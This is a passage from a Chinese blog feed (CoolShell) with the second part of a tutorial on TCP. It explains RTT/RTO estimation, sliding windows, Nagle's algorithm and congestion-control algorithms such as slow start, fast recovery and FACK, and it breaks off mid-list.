<p>好了，上篇就到这里结束了。如果你觉得我写得还比较浅显易懂，那么，欢迎移步看下篇《<a href="https://coolshell.cn/articles/11609.html" target="_blank">TCP的那些事（下）</a>》</p>
<p style="text-align: right;"><strong> <a href="https://coolshell.cn/articles/11609.html" target="_blank">TCP的那些事儿（下）&gt;&gt;&gt;</a></strong></p>
<p style="text-align: left;">（上篇完）</p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-05-28T08:15:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/11564.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ TCP 的那些事儿（下） ]]></title>
<link>https://coolshell.cn/articles/11609.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >这篇文章是下篇，所以如果你对TCP不熟悉的话，还请你先看看上篇《<a href="https://coolshell.cn/articles/11564.html" target="_blank">TCP的那些事儿（上）</a>》 上篇中，我们介绍了TCP的协议头、状态机、数据重传中的东西。但是TCP要解决一个很大的事，那就是要在一个网络根据不同的情况来动态调整自己的发包的速度，小则让自己的连接更稳定，大则让整个网络更稳定。在你阅读下篇之前，你需要做好准备，本篇文章有好些算法和策略，可能会引发你的各种思考，让你的大脑分配很多内存和计算资源，所以，不适合在厕所中阅读。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#TCP%E7%9A%84RTT%E7%AE%97%E6%B3%95" title="TCP的RTT算法">TCP的RTT算法</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95" title="经典算法">经典算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#Karn_Partridge_%E7%AE%97%E6%B3%95" title="Karn / Partridge 算法">Karn / Partridge 算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#Jacobson_Karels_%E7%AE%97%E6%B3%95" title="Jacobson / Karels 算法">Jacobson / Karels 算法</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#TCP%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3" title="TCP滑动窗口">TCP滑动窗口</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#Zero_Window" title="Zero Window">Zero Window</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#Silly_Window_Syndrome" title="Silly Window Syndrome">Silly Window Syndrome</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-8" href="#TCP%E7%9A%84%E6%8B%A5%E5%A1%9E%E5%A4%84%E7%90%86_-_Congestion_Handling" title="TCP的拥塞处理 – Congestion Handling">TCP的拥塞处理 – Congestion Handling</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%85%A2%E7%83%AD%E5%90%AF%E5%8A%A8%E7%AE%97%E6%B3%95_-_Slow_Start" title="慢热启动算法 – Slow Start">慢热启动算法 – Slow Start</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#_%E6%8B%A5%E5%A1%9E%E9%81%BF%E5%85%8D%E7%AE%97%E6%B3%95_-_Congestion_Avoidance" title=" 拥塞避免算法 – Congestion Avoidance"> 拥塞避免算法 – Congestion Avoidance</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E6%8B%A5%E5%A1%9E%E7%8A%B6%E6%80%81%E6%97%B6%E7%9A%84%E7%AE%97%E6%B3%95" title="拥塞状态时的算法">拥塞状态时的算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%BF%AB%E9%80%9F%E6%81%A2%E5%A4%8D%E7%AE%97%E6%B3%95_-_Fast_Recovery" title="快速恢复算法 – Fast Recovery">快速恢复算法 – Fast Recovery</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E7%AE%97%E6%B3%95%E7%A4%BA%E6%84%8F%E5%9B%BE" title="算法示意图">算法示意图</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#FACK%E7%AE%97%E6%B3%95" title="FACK算法">FACK算法</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-15" href="#%E5%85%B6%E5%AE%83%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B" title="其它拥塞控制算法简介">其它拥塞控制算法简介</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-16" href="#TCP_Vegas_%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95" title="TCP Vegas 拥塞控制算法">TCP Vegas 拥塞控制算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#HSTCPHigh_Speed_TCP_%E7%AE%97%E6%B3%95" title="HSTCP(High Speed TCP) 算法">HSTCP(High Speed TCP) 算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#_TCP_BIC_%E7%AE%97%E6%B3%95" title=" TCP BIC 算法"> TCP BIC 算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#TCP_WestWood%E7%AE%97%E6%B3%95" title="TCP WestWood算法">TCP WestWood算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-20" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#_%E5%90%8E%E8%AE%B0" title=" 后记"> 后记</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="TCP%E7%9A%84RTT%E7%AE%97%E6%B3%95"></span>TCP的RTT算法<span class="ez-toc-section-end"></span>
</h4>
<p>从前面的TCP重传机制我们知道Timeout的设置对于重传非常重要。</p>
<ul>
<li>设长了，重发就慢，丢了老半天才重发，没有效率，性能差；</li>
<li>设短了，会导致可能并没有丢就重发。于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。</li>
</ul>
<p>而且，这个超时时间在不同的网络的情况下，根本没有办法设置一个死的值。只能动态地设置。 为了动态地设置，TCP引入了RTT——Round Trip Time，也就是一个数据包从发出去到回来的时间。这样发送端就大约知道需要多少的时间，从而可以方便地设置Timeout——RTO（Retransmission TimeOut），以让我们的重传机制更高效。 听起来似乎很简单，好像就是在发送端发包时记下t0，然后接收端再把这个ack回来时再记一个t1，于是RTT = t1 – t0。没那么简单，这只是一个采样，不能代表普遍情况。</p>
<p><span id="more-11609"></span></p>
<h5>
<span class="ez-toc-section" id="%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95"></span>经典算法<span class="ez-toc-section-end"></span>
</h5>
<p><a href="https://tools.ietf.org/html/rfc793" target="_blank">RFC793</a> 中定义的经典算法是这样的：</p>
<p style="padding-left: 30px;">1）首先，先采样RTT，记下最近好几次的RTT值。</p>
<p style="padding-left: 30px;">2）然后做平滑计算SRTT（ Smoothed RTT）。公式为：（其中的 α 取值在0.8 到 0.9之间，这个算法英文叫Exponential weighted moving average，中文叫：加权移动平均）</p>
<p style="text-align: center;"><strong>SRTT = ( α * SRTT ) + ((1- α) * RTT)</strong></p>
<p style="padding-left: 30px;">3）开始计算RTO。公式如下：</p>
<p style="text-align: center;"><strong>RTO = min [ UBOUND,  max [ LBOUND,   (β * SRTT) ]  ]</strong></p>
<p>其中：</p>
<ul>
<li>UBOUND是最大的timeout时间，上限值</li>
<li>LBOUND是最小的timeout时间，下限值</li>
<li>β 值一般在1.3到2.0之间。</li>
</ul>
<h5>
<span class="ez-toc-section" id="Karn_Partridge_%E7%AE%97%E6%B3%95"></span>Karn / Partridge 算法<span class="ez-toc-section-end"></span>
</h5>
<p>但是上面的这个算法在重传的时候会出有一个终极问题——你是用第一次发数据的时间和ack回来的时间做RTT样本值，还是用重传的时间和ACK回来的时间做RTT样本值？</p>
<p>这个问题无论你选那头都是按下葫芦起了瓢。 如下图所示：</p>
<ul>
<li>情况（a）是ack没回来，所以重传。如果你计算第一次发送和ACK的时间，那么，明显算大了。</li>
<li>情况（b）是ack回来慢了，但是导致了重传，但刚重传不一会儿，之前ACK就回来了。如果你是算重传的时间和ACK回来的时间的差，就会算短了。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>所以1987年的时候，搞了一个叫<a href="https://en.wikipedia.org/wiki/Karn's_Algorithm" target="_blank">Karn / Partridge Algorithm</a>，这个算法的最大特点是——<strong>忽略重传，不把重传的RTT做采样</strong>（你看，你不需要去解决不存在的问题）。</p>
<p>但是，这样一来，又会引发一个大BUG——<strong>如果在某一时间，网络闪动，突然变慢了，产生了比较大的延时，这个延时导致要重转所有的包（因为之前的RTO很小），于是，因为重转的不算，所以，RTO就不会被更新，这是一个灾难</strong>。 于是Karn算法用了一个取巧的方式——只要一发生重传，就对现有的RTO值翻倍（这就是所谓的 Exponential backoff），很明显，这种死规矩对于一个需要估计比较准确的RTT也不靠谱。</p>
<h5>
<span class="ez-toc-section" id="Jacobson_Karels_%E7%AE%97%E6%B3%95"></span>Jacobson / Karels 算法<span class="ez-toc-section-end"></span>
</h5>
<p>前面两种算法用的都是“加权移动平均”，这种方法最大的毛病就是如果RTT有一个大的波动的话，很难被发现，因为被平滑掉了。所以，1988年，又有人推出来了一个新的算法，这个算法叫Jacobson / Karels Algorithm（参看<a href="https://tools.ietf.org/html/rfc6298" target="_blank">RFC6289</a>）。这个算法引入了最新的RTT的采样和平滑过的SRTT的差距做因子来计算。 公式如下：（其中的DevRTT是Deviation RTT的意思）</p>
<p style="padding-left: 30px;"><b>SRTT</b><b> = S</b><b>RTT</b><b> + α</b><b> </b><b>(</b><b>RTT</b><b> – S</b><b>RTT</b><b>)  </b>—— 计算平滑RTT</p>
<p style="padding-left: 30px;"><b>DevRTT</b><b> = (1-β</b><b>)*</b><b>DevRTT</b><b> + β</b><b>*(|</b><b>RTT-SRTT</b><b>|) </b>——计算平滑RTT和真实的差距（加权移动平均）</p>
<p style="padding-left: 30px;"><strong>RTO= µ * SRTT + ∂ *DevRTT </strong>—— 神一样的公式</p>
<p>（其中：在Linux下，α = 0.125，β = 0.25， μ = 1，∂ = 4 ——这就是算法中的“调得一手好参数”，nobody knows why, it just works…） 最后的这个算法在被用在今天的TCP协议中（Linux的源代码在：<a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_input.c?v=2.6.32#L609" target="_blank">tcp_rtt_estimator</a>）。</p>
<h4>
<span class="ez-toc-section" id="TCP%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3"></span>TCP滑动窗口<span class="ez-toc-section-end"></span>
</h4>
<p>需要说明一下，如果你不了解TCP的滑动窗口这个事，你等于不了解TCP协议。我们都知道，<strong>TCP必需要解决的可靠传输以及包乱序（reordering）的问题</strong>，所以，TCP必需要知道网络实际的数据处理带宽或是数据处理速度，这样才不会引起网络拥塞，导致丢包。</p>
<p>所以，TCP引入了一些技术和设计来做网络流控，Sliding Window是其中一个技术。 前面我们说过，<strong>TCP头里有一个字段叫Window，又叫Advertised-Window，这个字段是接收端告诉发送端自己还有多少缓冲区可以接收数据</strong>。<strong>于是发送端就可以根据这个接收端的处理能力来发送数据，而不会导致接收端处理不过来</strong>。 为了说明滑动窗口，我们需要先看一下TCP缓冲区的一些数据结构：</p>
<p><img alt="image placeholder" ></p>
<p>上图中，我们可以看到：</p>
<ul>
<li>接收端LastByteRead指向了TCP缓冲区中读到的位置，NextByteExpected指向的地方是收到的连续包的最后一个位置，LastByteRcved指向的是收到的包的最后一个位置，我们可以看到中间有些数据还没有到达，所以有数据空白区。</li>
</ul>
<ul>
<li>发送端的LastByteAcked指向了被接收端Ack过的位置（表示成功发送确认），LastByteSent表示发出去了，但还没有收到成功确认的Ack，LastByteWritten指向的是上层应用正在写的地方。</li>
</ul>
<p>于是：</p>
<ul>
<li>接收端在给发送端回ACK中会汇报自己的AdvertisedWindow = MaxRcvBuffer – LastByteRcvd – 1;</li>
</ul>
<ul>
<li>而发送方会根据这个窗口来控制发送数据的大小，以保证接收方可以处理。</li>
</ul>
<p>下面我们来看一下发送方的滑动窗口示意图：</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">（<a href="http://www.tcpipguide.com/free/t_TCPSlidingWindowAcknowledgmentSystemForDataTranspo-6.htm" target="_blank">图片来源</a>）</p>
<p>上图中分成了四个部分，分别是：（其中那个黑模型就是滑动窗口）</p>
<ul>
<li>#1已收到ack确认的数据。</li>
<li>#2发还没收到ack的。</li>
<li>#3在窗口中还没有发出的（接收方还有空间）。</li>
<li>#4窗口以外的数据（接收方没空间）</li>
</ul>
<p>下面是个滑动后的示意图（收到36的ack，并发出了46-51的字节）：</p>
<p><img alt="image placeholder" ></p>
<p>下面我们来看一个接受端控制发送端的图示：</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">（<a href="http://www.tcpipguide.com/free/t_TCPWindowSizeAdjustmentandFlowControl-2.htm" target="_blank">图片来源</a>）</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="Zero_Window"></span>Zero Window<span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: left;">上图，我们可以看到一个处理缓慢的Server（接收端）是怎么把Client（发送端）的TCP Sliding Window给降成0的。此时，你一定会问，如果Window变成0了，TCP会怎么样？是不是发送端就不发数据了？是的，发送端就不发数据了，你可以想像成“Window Closed”，那你一定还会问，如果发送端不发数据了，接收方一会儿Window size 可用了，怎么通知发送端呢？</p>
<p style="text-align: left;">解决这个问题，TCP使用了Zero Window Probe技术，缩写为ZWP，也就是说，发送端在窗口变成0后，会发ZWP的包给接收方，让接收方来ack他的Window尺寸，一般这个值会设置成3次，第次大约30-60秒（不同的实现可能会不一样）。如果3次过后还是0的话，有的TCP实现就会发RST把链接断了。</p>
<p style="text-align: left;"><strong>注意</strong>：只要有等待的地方都可能出现DDoS攻击，Zero Window也不例外，一些攻击者会在和HTTP建好链发完GET请求后，就把Window设置为0，然后服务端就只能等待进行ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。（关于这方面的攻击，大家可以移步看一下<a href="https://en.wikipedia.org/wiki/Sockstress" target="_blank">Wikipedia的SockStress词条</a>）</p>
<p style="text-align: left;">另外，Wireshark中，你可以使用tcp.analysis.zero_window来过滤包，然后使用右键菜单里的follow TCP stream，你可以看到ZeroWindowProbe及ZeroWindowProbeAck的包。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="Silly_Window_Syndrome"></span>Silly Window Syndrome<span class="ez-toc-section-end"></span>
</h5>
<p>Silly Window Syndrome翻译成中文就是“糊涂窗口综合症”。正如你上面看到的一样，如果我们的接收方太忙了，来不及取走Receive Windows里的数据，那么，就会导致发送方越来越小。到最后，如果接收方腾出几个字节并告诉发送方现在有几个字节的window，而我们的发送方会义无反顾地发送这几个字节。</p>
<p>要知道，我们的TCP+IP头有40个字节，为了几个字节，要达上这么大的开销，这太不经济了。</p>
<p>另外，你需要知道网络上有个MTU，对于以太网来说，MTU是1500字节，除去TCP+IP头的40个字节，真正的数据传输可以有1460，这就是所谓的MSS（Max Segment Size）注意，TCP的RFC定义这个MSS的默认值是536，这是因为<span style="color: #252525;"> </span><span class="reference-text" style="color: #252525;"><a class="external mw-magiclink-rfc" style="color: #663366;" href="https://tools.ietf.org/html/rfc791" rel="nofollow">RFC 791</a>里说了任何一个</span>IP设备都得最少接收576尺寸的大小（实际上来说576是拨号的网络的MTU，而576减去IP头的20个字节就是536）。</p>
<p><strong>如果你的网络包可以塞满MTU，那么你可以用满整个带宽，如果不能，那么你就会浪费带宽</strong>。（大于MTU的包有两种结局，一种是直接被丢了，另一种是会被重新分块打包发送） 你可以想像成一个MTU就相当于一个飞机的最多可以装的人，如果这飞机里满载的话，带宽最高，如果一个飞机只运一个人的话，无疑成本增加了，也而相当二。</p>
<p>所以，<strong>Silly Windows Syndrome这个现像就像是你本来可以坐200人的飞机里只做了一两个人</strong>。 要解决这个问题也不难，就是避免对小的window size做出响应，直到有足够大的window size再响应，这个思路可以同时实现在sender和receiver两端。</p>
<ul>
<li>如果这个问题是由Receiver端引起的，那么就会使用 David D Clark’s 方案。在receiver端，如果收到的数据导致window size小于某个值，可以直接ack(0)回sender，这样就把window给关闭了，也阻止了sender再发数据过来，等到receiver端处理了一些数据后windows size 大于等于了MSS，或者，receiver buffer有一半为空，就可以把window打开让send 发送数据过来。</li>
</ul>
<ul>
<li>如果这个问题是由Sender端引起的，那么就会使用著名的<span style="color: #252525;"> </span><a style="color: #0b0080;" title="Nagle's algorithm" href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm" target="_blank">Nagle’s algorithm</a>。这个算法的思路也是延时处理，他有两个主要的条件：1）要等到 Window Size&gt;=MSS 或是 Data Size &gt;=MSS，2）收到之前发送数据的ack回包，他才会发数据，否则就是在攒数据。</li>
</ul>
<p>另外，Nagle算法默认是打开的，所以，对于一些需要小包场景的程序——<strong>比如像telnet或ssh这样的交互性比较强的程序，你需要关闭这个算法</strong>。你可以在Socket设置TCP_NODELAY选项来关闭这个算法（关闭Nagle算法没有全局参数，需要根据每个应用自己的特点来关闭）</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&amp;value,sizeof(int));</code></p>
<p>另外，网上有些文章说<span style="color: #000000;">TCP_CORK的socket option是也关闭Nagle算法，这不对。<strong>TCP_CORK其实是更新激进的Nagle算汉，完全禁止小包发送，而Nagle算法没有禁止小包发送，只是禁止了大量的小包发送</strong>。最好不要两个选项都设置。</span></p>
<h4>
<span class="ez-toc-section" id="TCP%E7%9A%84%E6%8B%A5%E5%A1%9E%E5%A4%84%E7%90%86_-_Congestion_Handling"></span>TCP的拥塞处理 – Congestion Handling<span class="ez-toc-section-end"></span>
</h4>
<p>上面我们知道了，TCP通过Sliding Window来做流控（Flow Control），但是TCP觉得这还不够，因为Sliding Window需要依赖于连接的发送端和接收端，其并不知道网络中间发生了什么。TCP的设计者觉得，一个伟大而牛逼的协议仅仅做到流控并不够，因为流控只是网络模型4层以上的事，TCP的还应该更聪明地知道整个网络上的事。</p>
<p>具体一点，我们知道TCP通过一个timer采样了RTT并计算RTO，但是，<strong>如果网络上的延时突然增加，那么，TCP对这个事做出的应对只有重传数据，但是，重传会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，于是，这个情况就会进入恶性循环被不断地放大。试想一下，如果一个网络内有成千上万的TCP连接都这么行事，那么马上就会形成“网络风暴”，TCP这个协议就会拖垮整个网络。</strong>这是一个灾难。</p>
<p>所以，TCP不能忽略网络上发生的事情，而无脑地一个劲地重发数据，对网络造成更大的伤害。对此TCP的设计理念是：<span style="color: #cc0000;"><strong>TCP不是一个自私的协议，当拥塞发生的时候，要做自我牺牲。就像交通阻塞一样，每个车都应该把路让出来，而不要再去抢路了。</strong></span></p>
<p>关于拥塞控制的论文请参看《<a href="http://ee.lbl.gov/papers/congavoid.pdf" target="_blank">Congestion Avoidance and Control</a>》(PDF)</p>
<p>拥塞控制主要是四个算法：<strong>1）慢启动</strong>，<strong>2）拥塞避免</strong>，<strong>3）拥塞发生</strong>，<strong>4）快速恢复</strong>。这四个算法不是一天都搞出来的，这个四算法的发展经历了很多时间，到今天都还在优化中。 备注:</p>
<ul>
<li>1988年，TCP-Tahoe 提出了1）慢启动，2）拥塞避免，3）拥塞发生时的快速重传</li>
<li>1990年，TCP Reno 在Tahoe的基础上增加了4）快速恢复</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E6%85%A2%E7%83%AD%E5%90%AF%E5%8A%A8%E7%AE%97%E6%B3%95_-_Slow_Start"></span>慢热启动算法 – Slow Start<span class="ez-toc-section-end"></span>
</h5>
<p>首先，我们来看一下TCP的慢热启动。慢启动的意思是，刚刚加入网络的连接，一点一点地提速，不要一上来就像那些特权车一样霸道地把路占满。新同学上高速还是要慢一点，不要把已经在高速上的秩序给搞乱了。</p>
<p>慢启动的算法如下(cwnd全称Congestion Window)：</p>
<p style="padding-left: 30px;">1）连接建好的开始先初始化cwnd = 1，表明可以传一个MSS大小的数据。</p>
<p style="padding-left: 30px;">2）每当收到一个ACK，cwnd++; 呈线性上升</p>
<p style="padding-left: 30px;">3）每当过了一个RTT，cwnd = cwnd*2; 呈指数让升</p>
<p style="padding-left: 30px;">4）还有一个ssthresh（slow start threshold），是一个上限，当cwnd &gt;= ssthresh时，就会进入“拥塞避免算法”（后面会说这个算法）</p>
<p>所以，我们可以看到，如果网速很快的话，ACK也会返回得快，RTT也会短，那么，这个慢启动就一点也不慢。下图说明了这个过程。</p>
<p><img alt="image placeholder" ></p>
<p>这里，我需要提一下的是一篇Google的论文<span style="color: #000000;">《<a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//pubs/archive/36640.pdf" target="_blank">An Argument for Increasing TCP’s Initial Congestion Window</a>》Linux 3.0后采用了这篇论文的建议——把cwnd 初始化成了 10个MSS。</span> <span style="color: #000000;">而Linux 3.0以前，比如2.6，Linux采用了<a href="https://www.rfc-editor.org/rfc/rfc3390.txt" target="_blank">RFC3390</a>，cwnd是跟MSS的值来变的，如果MSS&lt; 1095，则cwnd = 4；如果MSS&gt;2190，则cwnd=2；其它情况下，则是3。</span></p>
<h5>
<span class="ez-toc-section" id="_%E6%8B%A5%E5%A1%9E%E9%81%BF%E5%85%8D%E7%AE%97%E6%B3%95_-_Congestion_Avoidance"></span> 拥塞避免算法 – Congestion Avoidance<span class="ez-toc-section-end"></span>
</h5>
<p>前面说过，还有一个ssthresh（slow start threshold），是一个上限，当cwnd &gt;= ssthresh时，就会进入“拥塞避免算法”。一般来说ssthresh的值是65535，单位是字节，当cwnd达到这个值时后，算法如下：</p>
<p style="padding-left: 30px;">1）收到一个ACK时，cwnd = cwnd + 1/cwnd</p>
<p style="padding-left: 30px;">2）当每过一个RTT时，cwnd = cwnd + 1</p>
<p>这样就可以避免增长过快导致网络拥塞，慢慢的增加调整到网络的最佳值。很明显，是一个线性上升的算法。</p>
<h5>
<span class="ez-toc-section" id="%E6%8B%A5%E5%A1%9E%E7%8A%B6%E6%80%81%E6%97%B6%E7%9A%84%E7%AE%97%E6%B3%95"></span>拥塞状态时的算法<span class="ez-toc-section-end"></span>
</h5>
<p>前面我们说过，当丢包的时候，会有两种情况：</p>
<p style="padding-left: 30px;">1）等到RTO超时，重传数据包。TCP认为这种情况太糟糕，反应也很强烈。</p>
<ul>
<ul>
<li>sshthresh =  cwnd /2</li>
<li>cwnd 重置为 1</li>
<li>进入慢启动过程</li>
</ul>
</ul>
<p style="padding-left: 30px;">2）Fast Retransmit算法，也就是在收到3个duplicate ACK时就开启重传，而不用等到RTO超时。</p>
<ul>
<ul>
<li>TCP Tahoe的实现和RTO超时一样。</li>
</ul>
</ul>
<ul>
<ul>
<li>TCP Reno的实现是：
<ul>
<li>cwnd = cwnd /2</li>
<li>sshthresh = cwnd</li>
<li>进入快速恢复算法——Fast Recovery</li>
</ul>
</li>
</ul>
</ul>
<p>上面我们可以看到RTO超时后，sshthresh会变成cwnd的一半，这意味着，如果cwnd&lt;=sshthresh时出现的丢包，那么TCP的sshthresh就会减了一半，然后等cwnd又很快地以指数级增涨爬到这个地方时，就会成慢慢的线性增涨。我们可以看到，TCP是怎么通过这种强烈地震荡快速而小心得找到网站流量的平衡点的。</p>
<h5>
<span class="ez-toc-section" id="%E5%BF%AB%E9%80%9F%E6%81%A2%E5%A4%8D%E7%AE%97%E6%B3%95_-_Fast_Recovery"></span>快速恢复算法 – Fast Recovery<span class="ez-toc-section-end"></span>
</h5>
<p><span style="text-decoration: underline;"><strong>TCP Reno</strong></span></p>
<p><span style="color: #000000;">这个算法定义在</span><a title='"TCP Congestion Control"' href="https://tools.ietf.org/html/rfc5681">RFC5681</a>。快速重传和快速恢复算法一般同时使用。快速恢复算法是认为，你还有3个Duplicated Acks说明网络也不那么糟糕，所以没有必要像RTO超时那么强烈。 <span style="color: #000000;">注意，正如前面所说，进入Fast Recovery之前，cwnd 和 sshthresh已被更新：</span></p>
<ul>
<li>cwnd = cwnd /2</li>
<li>sshthresh = cwnd</li>
</ul>
<p><span style="color: #000000;">然后，真正的Fast Recovery算法如下：</span></p>
<ul>
<li>cwnd = sshthresh  + 3 * MSS （3的意思是确认有3个数据包被收到了）</li>
<li>重传Duplicated ACKs指定的数据包</li>
<li>如果再收到 duplicated Acks，那么cwnd = cwnd +1</li>
<li>如果收到了新的Ack，那么，cwnd = sshthresh ，然后就进入了拥塞避免的算法了。</li>
</ul>
<p>如果你仔细思考一下上面的这个算法，你就会知道，<strong>上面这个算法也有问题，那就是——它依赖于3个重复的Acks</strong>。注意，3个重复的Acks并不代表只丢了一个数据包，很有可能是丢了好多包。但这个算法只会重传一个，而剩下的那些包只能等到RTO超时，于是，进入了恶梦模式——超时一个窗口就减半一下，多个超时会超成TCP的传输速度呈级数下降，而且也不会触发Fast Recovery算法了。</p>
<p>通常来说，正如我们前面所说的，SACK或D-SACK的方法可以让Fast Recovery或Sender在做决定时更聪明一些，但是并不是所有的TCP的实现都支持SACK（SACK需要两端都支持），所以，需要一个没有SACK的解决方案。而通过SACK进行拥塞控制的算法是FACK（后面会讲）</p>
<p><span style="text-decoration: underline;"><strong>TCP New Reno</strong></span></p>
<p><span style="color: #252525;">于是，1995年，TCP New Reno（参见 </span><a class="external mw-magiclink-rfc" style="color: #663366;" href="https://tools.ietf.org/html/rfc6582" rel="nofollow">RFC 6582</a> ）算法提出来，主要就是在没有SACK的支持下改进Fast Recovery算法的——</p>
<ul>
<li>当sender这边收到了3个Duplicated Acks，进入Fast Retransimit模式，开发重传重复Acks指示的那个包。如果只有这一个包丢了，那么，重传这个包后回来的Ack会把整个已经被sender传输出去的数据ack回来。如果没有的话，说明有多个包丢了。我们叫这个ACK为Partial ACK。</li>
</ul>
<ul>
<li>一旦Sender这边发现了Partial ACK出现，那么，sender就可以推理出来有多个包被丢了，于是乎继续重传sliding window里未被ack的第一个包。直到再也收不到了Partial Ack，才真正结束Fast Recovery这个过程</li>
</ul>
<p>我们可以看到，这个“Fast Recovery的变更”是一个非常激进的玩法，他同时延长了Fast Retransmit和Fast Recovery的过程。</p>
<h5>
<span class="ez-toc-section" id="%E7%AE%97%E6%B3%95%E7%A4%BA%E6%84%8F%E5%9B%BE"></span>算法示意图<span class="ez-toc-section-end"></span>
</h5>
<p>下面我们来看一个简单的图示以同时看一下上面的各种算法的样子：</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h5>
<span class="ez-toc-section" id="FACK%E7%AE%97%E6%B3%95"></span>FACK算法<span class="ez-toc-section-end"></span>
</h5>
<p>FACK全称Forward Acknowledgment 算法，论文地址在这里（PDF）<a href="http://conferences.sigcomm.org/sigcomm/1996/papers/mathis.pdf" target="_blank">Forward Acknowledgement: Refining TCP Congestion Control</a> 这个算法是其于SACK的，前面我们说过SACK是使用了TCP扩展字段Ack了有哪些数据收到，哪些数据没有收到，他比Fast Retransmit的3 个duplicated acks好处在于，前者只知道有包丢了，不知道是一个还是多个，而SACK可以准确的知道有哪些包丢了。 所以，SACK可以让发送端这边在重传过程中，把那些丢掉的包重传，而不是一个一个的传，但这样的一来，如果重传的包数据比较多的话，又会导致本来就很忙的网络就更忙了。所以，FACK用来做重传过程中的拥塞流控。</p>
<ul>
<li>这个算法会把SACK中最大的Sequence Number 保存在<strong>snd.fack</strong>这个变量中，snd.fack的更新由ack带秋，如果网络一切安好则和snd.una一样（snd.una就是还没有收到ack的地方，也就是前面sliding window里的category #2的第一个地方）</li>
</ul>
<ul>
<li>然后定义一个<strong>awnd = snd.nxt – snd.fack</strong>（snd.nxt指向发送端sliding window中正在要被发送的地方——前面sliding windows图示的category#3第一个位置），这样awnd的意思就是在网络上的数据。（所谓awnd意为：actual quantity of data outstanding in the network）</li>
</ul>
<ul>
<li>如果需要重传数据，那么，<strong>awnd = snd.nxt – snd.fack + retran_data</strong>，也就是说，awnd是传出去的数据 + 重传的数据。</li>
</ul>
<ul>
